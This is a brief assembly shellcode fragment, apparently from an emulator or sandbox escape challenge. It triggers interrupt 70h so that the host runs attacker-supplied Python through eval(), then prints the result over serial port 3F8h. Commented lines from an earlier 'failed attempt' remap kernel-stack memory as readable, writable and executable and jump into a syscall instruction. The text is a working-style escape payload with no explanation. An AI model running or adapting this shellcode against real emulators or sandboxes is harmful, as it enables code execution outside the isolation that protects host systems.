# Execute command in python eval()
mov rax, 7;
mov rdi, 0xffff8801ffffefb0; #python_code
mov rdx, 67; # python_size
mov rsi, rdi; # Output buffer
int     70h;


#print result at the console
mov rsi, 0xffff8801ffffefb0;
mov cx, ax;
mov rax, rcx;
mov     dx, 3F8h;
rep outsb;
iret;


# Shellcode from failed attempt
# mov rax, 0x9; add rax, 1; mov rdi, KERNEL_STACK - MAPPING_SIZE; mov rsi, MAPPING_SIZE; mov rdx, UC_PROT_READ | UC_PROT_WRITE | UC_PROT_EXEC; push syscall_instr_addr; ret;
# mov rax, 0x9; add rax, 1; mov rdi, 0xffff8801ffeff000; mov rsi, 0x100000; mov rdx, 0x7; push 0x00000000400034F; ret;